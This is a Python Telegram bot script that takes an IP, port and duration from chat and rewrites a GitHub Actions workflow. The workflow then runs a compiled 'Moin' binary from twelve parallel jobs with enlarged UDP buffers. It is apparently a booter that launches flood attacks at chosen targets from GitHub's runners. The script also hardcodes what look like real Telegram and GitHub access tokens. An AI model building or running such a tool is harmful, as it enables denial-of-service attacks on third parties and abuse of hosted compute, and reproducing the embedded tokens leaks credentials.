import os
import requests
import base64
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, MessageHandler, filters

# ====== CONFIG ======
TELEGRAM_TOKEN = "7343295464:AAEM7vk5K3cNXAywZC_Q11wmMzMu4gk09PU"
GITHUB_TOKEN = "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"
GITHUB_REPO = "Moin"  # Repo name
WORKFLOW_PATH = ".github/workflows/Moin.yml"

# ====== HELPERS ======
def update_workflow_content(ip: str, port: str, duration: str) -> str:
    """
    Returns the workflow content with updated IP, port, and duration.
    """
    return f"""name: Moin
on:
  push:
  pull_request:
  schedule:
    - cron: '0 */7 * * *'
  workflow_dispatch:
jobs:
  build_and_run:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        job: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12]
    steps:
      - name: Checkout code
        uses: actions/checkout@v3

      - name: Increase system UDP/Memory limits (where possible)
        run: |
          ulimit -f unlimited
          ulimit -v unlimited
          ulimit -s unlimited
          sudo sysctl -w net.core.rmem_max=26214400
          sudo sysctl -w net.core.wmem_max=26214400

      - name: Compile Moin.c
        run: gcc -o Moin Moin.c -lssl -lcrypto -lpthread
        
      - name: Make Moin executable
        run: chmod +x Moin

      - name: Run Moin
        run: ./Moin {ip} {port} {duration}
"""

def github_update_file(content: str) -> bool:
    """
    Update the workflow file on GitHub via API.
    """
    url = f"https://api.github.com/repos/{GITHUB_REPO}/contents/{WORKFLOW_PATH}"
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}

    # Step 1: Get the current file info (SHA is required for update)
    r = requests.get(url, headers=headers)
    if r.status_code != 200:
        print("❌ Failed to fetch workflow file:", r.text)
        return False
    data = r.json()
    sha = data['sha']

    # Step 2: Base64 encode content properly
    content_b64 = base64.b64encode(content.encode("utf-8")).decode("utf-8")

    # Step 3: Update file
    payload = {
        "message": "⚡ Update workflow via Telegram bot",
        "content": content_b64,
        "sha": sha,
        "branch": "main"
    }

    r2 = requests.put(url, headers=headers, json=payload)
    if r2.status_code in [200, 201]:
        return True
    else:
        print("❌ Failed to update workflow file:", r2.text)
        return False

# ====== TELEGRAM BOT HANDLERS ======
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🎉 <b>Welcome to Moin Workflow Bot!</b>\n\n"
        "Send me your <i>IP PORT DURATION</i> in this format:\n"
        "🌐 20.198.111.86 10469 300\n\n"
        "✅ Example:\n"
        "<code>20.198.111.86 10469 300</code>\n\n"
        "⚡ I will update the GitHub Actions workflow automatically!",
        parse_mode="HTML"
    )

async def handle_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        text = update.message.text.strip()
        parts = text.split()
        if len(parts) != 3:
            await update.message.reply_text("❌ Invalid format! Use: IP PORT DURATION")
            return
        ip, port, duration = parts

        workflow_content = update_workflow_content(ip, port, duration)
        success = github_update_file(workflow_content)
        if success:
            await update.message.reply_text(
                f"✅ <b>Workflow Updated Successfully!</b>\n\n"
                f"🌐 IP: <code>{ip}</code>\n"
                f"🔌 Port: <code>{port}</code>\n"
                f"⏱ Duration: <code>{duration}</code>\n\n"
                "⚡ You can now trigger the workflow on GitHub Actions.",
                parse_mode="HTML"
            )
        else:
            await update.message.reply_text("❌ Failed to update workflow on GitHub.")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

# ====== BOT RUN ======
app = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
app.add_handler(CommandHandler("start", start))
app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_input))

print("🚀 Bot is running...")
app.run_polling()